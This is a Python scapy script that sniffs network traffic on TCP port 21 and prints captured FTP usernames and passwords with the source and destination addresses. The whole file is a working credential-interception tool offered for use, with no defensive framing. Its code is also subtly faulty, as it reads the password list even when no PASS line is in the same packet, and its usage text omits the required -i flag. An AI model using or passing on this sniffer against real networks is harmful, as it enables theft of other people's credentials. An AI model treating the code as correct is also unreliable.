#!/usr/bin/env python3
"""
ftp_sniffer.py: This script allows to sniff FTP commands communicating in the network.

Usage: python3 ftp_sniffer.py <interface>

"""
import optparse
import re

import scapy.all as scapy


def ftp_sniffer(packet):
    """ Obtain the information from the packet. """
    if packet.haslayer(scapy.IP):

        # Obtain the IP layer
        ip_layer = packet.getlayer(scapy.IP)

        # Obtain the source and destination IP addresses
        ip_src = ip_layer.src
        ip_dst = ip_layer.dst

        # Obtain the user and password from the RAw TCP layer
        raw = packet.sprintf('%Raw.load%')
        user = re.findall('(?i)USER (.*)', raw)
        password = re.findall('(?i)PASS (.*)', raw)

        if user:
            print(f"[+] Detected FTP login to {ip_dst} from {ip_src} with username: {user[0]} and password: {password[0]}")


def main():
    parser = optparse.OptionParser('Usage: python3 ftp_sniffer.py <interface>')
    parser.add_option('-i', '--interface', dest='interface',
                    help='Interface to listen on', type="string")

    (options, args) = parser.parse_args()

    if options.interface is None:
        print(parser.usage)
        exit(0)

    else:
        scapy.conf.iface = options.interface

    try:
        scapy.sniff(filter='tcp port 21', store=False, prn=ftp_sniffer)

    except KeyboardInterrupt:
        print('\nExiting...')
        exit()


main()
